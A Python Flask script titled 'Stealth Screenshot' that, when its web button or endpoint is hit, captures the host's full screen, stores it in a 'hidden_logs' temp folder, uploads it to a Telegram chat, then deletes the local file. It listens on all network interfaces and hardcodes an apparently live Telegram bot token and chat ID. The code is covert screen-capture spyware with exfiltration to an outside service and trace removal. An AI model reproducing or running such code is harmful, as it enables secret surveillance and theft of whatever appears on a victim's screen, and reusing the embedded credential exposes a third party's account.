from flask import Flask, Response
from PIL import ImageGrab
import datetime
import os
import requests

app = Flask(__name__)

# ✅ Your actual Telegram bot token & chat ID
BOT_TOKEN = '8498233036:AAGETO08abtDSOJdzFzPnvXsKAcbwyIbTRM'
CHAT_ID = '7698113513'

@app.route('/')
def home():
    return '''
    <html>
      <head><title>Stealth Screenshot</title></head>
      <body style="text-align:center; padding-top:100px;">
        <h2>📸 Take a Screenshot</h2>
        <button onclick="fetch('/take_screenshot').then(() => alert('Screenshot Taken and Sent!'))"
                style="font-size:20px; padding:10px 20px;">Take Screenshot</button>
      </body>
    </html>
    '''

@app.route('/take_screenshot', methods=['GET'])
def take_screenshot():
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    save_path = os.path.join(os.getenv("LOCALAPPDATA"), "Temp", "hidden_logs")
    os.makedirs(save_path, exist_ok=True)

    file_path = os.path.join(save_path, f"screenshot_{now}.png")
    img = ImageGrab.grab()
    img.save(file_path)

    # ✅ Upload to Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(file_path, 'rb') as photo:
        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})

    # ✅ Delete from laptop
    os.remove(file_path)

    return Response("Screenshot taken and sent.", status=200)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
